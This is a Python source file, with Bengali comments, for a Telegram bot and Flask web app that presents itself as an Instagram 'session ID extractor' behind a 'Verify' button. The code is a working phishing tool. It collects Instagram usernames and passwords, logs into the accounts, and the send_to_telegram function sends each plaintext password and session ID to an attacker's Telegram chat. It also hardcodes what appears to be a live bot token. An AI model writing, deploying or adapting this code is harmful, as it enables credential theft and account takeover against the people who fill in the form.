import os
import threading
import requests
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from instagrapi import Client

# ==========================================
# এখানে আপনার তথ্যগুলো বসান
BOT_TOKEN = '8964988842:AAFYXchGL11zb6K2LfOoEAfnO-IxVtGYBKM'
ADMIN_CHAT_ID = '5428249457' # @userinfobot থেকে নিন
# আপনার Render অ্যাপের লাইভ লিংক (যেমন: https://my-app.onrender.com)
WEB_APP_URL = 'https://hlo-world.onrender.com' 
# ==========================================

# --- ১. টেলিগ্রাম বট সেটআপ ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("✅ Verify & Open Panel", web_app=WebAppInfo(url=WEB_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "স্বাগতম! সিস্টেমে প্রবেশ করতে নিচের Verify বাটনে ক্লিক করুন।", 
        reply_markup=reply_markup
    )

def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("Bot is running...")
    app.run_polling()

# --- ২. ওয়েবসাইট সেটআপ (Flask) ---
web_app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Panel</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: white; text-align: center; padding: 20px; margin: 0; }
        .box { background: #1e293b; padding: 25px; border-radius: 10px; max-width: 400px; margin: 40px auto; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        input { padding: 12px; margin: 10px 0; width: 90%; border-radius: 5px; border: 1px solid #334155; background: #0f172a; color: white; }
        button { padding: 12px; width: 100%; background: #3b82f6; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
        button:hover { background: #2563eb; }
        .error { color: #ef4444; margin-top: 15px; }
        .success { color: #10b981; margin-top: 15px; word-break: break-all; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Extract Session ID</h2>
        <form action="/submit" method="POST">
            <input type="text" name="username" placeholder="Instagram Username" required><br>
            <input type="password" name="password" placeholder="Instagram Password" required><br>
            <button type="submit">Extract Now</button>
        </form>
        <div id="message"></div>
    </div>
</body>
</html>
"""

@web_app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@web_app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    
    try:
        cl = Client()
        cl.login(username, password)
        session_id = cl.sessionid
        
        # টেলিগ্রামে পাঠানো
        send_to_telegram(username, password, session_id)
        
        return f'<div class="box"><h3 class="success">Success!</h3><p>Session ID: {session_id}</p><p>Admin has been notified.</p></div>'
    except Exception as e:
        return f'<div class="box"><h3 class="error">Login Failed</h3><p>{str(e)}</p></div>'

def send_to_telegram(user, pw, sess_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    text = f"🔔 **New Login Info**\n\n👤 Username: `{user}`\n🔑 Password: `{pw}`\n🔗 Session: `{sess_id}`"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

# --- ৩. বট চালু করা (Render এর জন্য) ---
# gunicorn যাতে বটের থ্রেডটি চালু করতে পারে, তাই এটি মেইন ব্লকের বাইরে রাখা হলো
threading.Thread(target=run_bot, daemon=True).start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    web_app.run(host='0.0.0.0', port=port)
